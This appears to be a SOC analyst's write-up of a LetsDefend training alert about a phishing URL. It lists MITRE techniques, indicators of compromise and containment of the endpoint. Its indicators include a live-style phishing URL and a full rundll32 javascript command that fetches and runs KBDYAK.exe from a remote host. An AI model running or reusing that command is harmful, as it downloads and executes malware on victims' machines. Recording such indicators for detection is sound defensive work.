# SOC141 - Phishing URL Detected

| Field | Value |
|---------|---------|
| Alert Name | SOC141 - Phishing URL Detected (EventID: 86 from LetsDefend) |
| Date Investigated | 2026-06-16 |
| Event Time | Mar, 22, 2021, 09:23 PM |
| Verdict | True Positive |
| Time Spent | 40 mins |

## 1. Threat Frameworks & Impact

- **MITRE ATT&CK:**
  - T1566.002 – Phishing: Spearphishing Link
  - T1218.011 – Signed Binary Proxy Execution: Rundll32
- **CVE:** N/A
- **Impact:** High

## 2. The "Why" (Core Evidence)

- The alert was triggered because a malicious phishing URL was allowed.
- Since the action was marked as "Allowed," the malicious payload was successfully delivered to the endpoint.

## 3. Key IOCs

- **Phishing URL** `http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php?email=ellie@letsdefend.io`
- **Suspicious Process** `c:/windows/system32/notepad.exe`
- **Malicious Process** `KBDYAK.exe`
- **Malicious Command** `rundll32.exe javascript:'../mshtml,RunHTMLApplication ';document.write();GetObject('script:http://ru-uid-507352920.pp.ru/KBDYAK.exe')'`

## 4. Action Taken & Takeaway

- **Action:** Contained the affected endpoint.